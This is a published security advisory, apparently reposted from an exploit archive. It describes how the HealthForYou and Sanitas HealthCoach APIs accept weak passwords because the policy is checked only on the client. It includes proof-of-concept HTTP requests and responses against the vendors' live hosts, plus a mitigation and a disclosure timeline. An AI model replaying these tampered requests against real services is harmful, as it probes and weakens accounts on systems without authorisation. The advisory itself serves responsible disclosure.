@@ -1,0 +1,204 @@
+id: 37004
+date: 11/06/2021
+title: HealthForYou 1.11.1 / HealthCoach 2.9.2 Missing Password Policy Vulnerability
+author: Nick Decker
+cves: 
+
+Overview
+########
+
+Advisory ID: TRSA-2104-03
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2104-03
+Affected product: HealthForYou & Sanitas HealthCoach mobile and web applications
+Tested versions: HealthForYou 1.11.1 (com.hansdinslage.connect.HealthForYou),
+                 HealthCoach 2.9.2 (de.sanitas_online.healthcoach)
+Vendor: Hans Dinslage GmbH (subsidiary of Beurer GmbH https://www.beurer.com)
+Credits: Trovent Security GmbH, Nick Decker
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered an inconsistency between the
+API and the client of HealthForYou & Sanitas HealthCoach.
+When creating an account or changing your password
+the mobile and web application both check the password against
+the password policy. But the API assumes that the given password
+is already checked therefore an attacker can intercept the HTTP request
+and change it to a weak password.
+In our testing we managed to change it to a single character or
+clear it completly, but this was not practical as it raises
+execptions in the application when trying to login.
+
+Severity: Medium
+CVSS Score: 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)
+CWE ID: CWE-521
+CVE ID: N/A
+
+
+Proof of concept
+################
+
+HealthForYou
+############
+
+Sample request to change the password during registration:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/User/PostCreateNewUser/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Accept-Encoding: gzip, deflate
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.healthforyou-lidl.com
+Connection: close
+Content-Length: 717
+
+{"Email":"proof@trovent.io","UserLevel":"Advanced","IsReceiveNewsLetters":false,"Gender":1,"Source":"AN017","isDoubleOptInNewsletter":1,"HeightInch":7,"DOB":"1980-01-17",
+"IsGDPRAccepted":1,"IsCreateFromIPhone":true,"InformationNewsLetterGlobalTime":"2021-05-03T10:30:55.877","GDPRAcceptedPlatform":"ANDROID","PersonalisedNewsletter":0,
+"Settings":{"TimeFormat":"24-hours","MetricFormat":"Metric","Language":"en-US","DateFormat":"MM/dd/yyyy"},"Password":"p",[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 7254
+etag: W/"1c56-mp1tZlTlMvwrdNVYbfZsuHeipuc"
+date: Mon, 03 May 2021 10:31:01 GMT
+x-envoy-upstream-service-time: 631
+server: istio-envoy
+connection: close
+
+{"Email":"proof@trovent.io","UserLevel":"Advanced","IsReceiveNewsLetters":false,"Gender":1,"isDoubleOptInNewsletter":1,"HeightInch":7,"DOB":"1980-01-17T00:00:00",
+"IsGDPRAccepted":1,"InformationNewsLetterGlobalTime":"2021-05-03T10:30:55+00:00","GDPRAcceptedPlatform":"ANDROID","PersonalisedNewsletter":0,"InformationNewsLetter":0,
+"HeightCm":170,"GDPRAcceptedDateTime":"2021-05-03T10:30:55+00:00","FirstName":"poc","PersonalisedNewsletterGlobalTime":"2021-05-03T10:30:55+00:00","HeightFeet":5,
+"culture":"en-US","LastName":"poc","EmailSalt":"vNHHXcoRQFYUdxky0wR16v95wdHWyE6","UniqueId":"0b71e470-f587-4976-b7ec-8f7fb89c2102","UserID1":1210679,
+"password":"Uu/CVGZ6c0IxnT/vbUvHL3HHK7MbiVq","EncryptedPassword":"Uu/CVGZ6c0IxnT/vbUvHL3HHK7MbiVq","salt":"$2b$10$ibYORUPMB1KMfxWCgPofcO",[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+HealthCoach
+###########
+
+Sample request to change the password during registration:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+POST /BHMCWebAPI/User/PostCreateNewUser/ HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+Accept-Encoding: gzip, deflate
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.connect-sanitas-online.de
+Connection: close
+Content-Length: 562
+
+{"HeightCm":170,"Email":"n.decker@trovent.io","GDPRAcceptedDateTime":"2021-05-03 08:19:40","UserLevel":"Advanced","FirstName":"poc","IsReceiveNewsLetters":false,
+"ReceiveNewsLettersGlobalTime":"2021-05-03T08:19:40.300","Gender":1,"Source":"AN014","isDoubleOptInNewsletter":1,"HeightInch":7,"HeightFeet":5,"DOB":"1996-05-13",
+"culture":"en-US","IsGDPRAccepted":1,"IsCreateFromIPhone":true,"LastName":"poc","GDPRAcceptedPlatform":"ANDROID",
+"Settings":{"TimeFormat":"12-hours","MetricFormat":"Imperial","Language":"en-US","DateFormat":"MM/dd/yyyy"},"Password":"p"}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 5435
+etag: W/"153b-exyfFUpcc2Zy5S1tFcx40HJaU+Q"
+date: Mon, 03 May 2021 08:19:41 GMT
+x-envoy-upstream-service-time: 515
+server: istio-envoy
+connection: close
+
+{"Email":"n.decker@trovent.io","GDPRAcceptedDateTime":"2021-05-03T08:19:40+00:00","UserLevel":"Advanced","FirstName":"poc","IsReceiveNewsLetters":false,
+"ReceiveNewsLettersGlobalTime":"2021-05-03T08:19:40+00:00","Gender":1,"isDoubleOptInNewsletter":1,"culture":"en-US","IsGDPRAccepted":1,"LastName":"poc",
+"GDPRAcceptedPlatform":"ANDROID","EmailSalt":"JvwjiKXsfF3yGyai4dNh1TgR26ulz9u","UserID1":1054887,"password":"CvScf8yLGvfL3RImfoMrnn6cNFvZ8Li",
+"EncryptedPassword":"CvScf8yLGvfL3RImfoMrnn6cNFvZ8Li","salt":"$2b$10$O13K3YzCyjQ8w/DEFDYIvO",[shortened for better readability]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Sample request made to change the password to one character:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+GET /BHMCWebAPI/User/GetUpdatePassword?finalidentifier=[redacted]&currentpassword=Pentest&newpassword=p HTTP/1.1
+Authorization: Android#[redacted]#e00e9945-57ba-44d0-89f6-865da419a2d3
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
+Host: sync.connect-sanitas-online.de
+Connection: close
+Accept-Encoding: gzip, deflate
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+content-type: application/json; charset=utf-8
+content-length: 119
+etag: W/"77-A0ItMApVWcTRuM8VBvCSqOlv8eo"
+date: Mon, 26 Apr 2021 10:41:04 GMT
+x-envoy-upstream-service-time: 153
+server: istio-envoy
+connection: close
+
+{"changePasswordStatus":1,"EncryptedPassword":"AWefAKVcQX4czpSO9pjiwOP1uYJpUeG","salt":"$2b$10$XAH0KWMVlF25Ui7usxTvq."}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to verify the input given by the
+user not only on the client side but also on the server side.
+
+
+History
+#######
+
+2021-04-26: Vulnerability found and advisory created
+2021-05-04: Vendor contacted
+2021-06-28: Vendor replied that the vulnerability is fixed
+2021-06-29: Trovent informed vendor that the problem still exists at password reset or change
+2021-07-01: Vendor replied that remediation is in progress
+2021-08-04: Vendor contacted, asking for status of remediation
+2021-11-05: No reply from vendor, advisory published
+
+#  0day.today [2023-03-22]  #
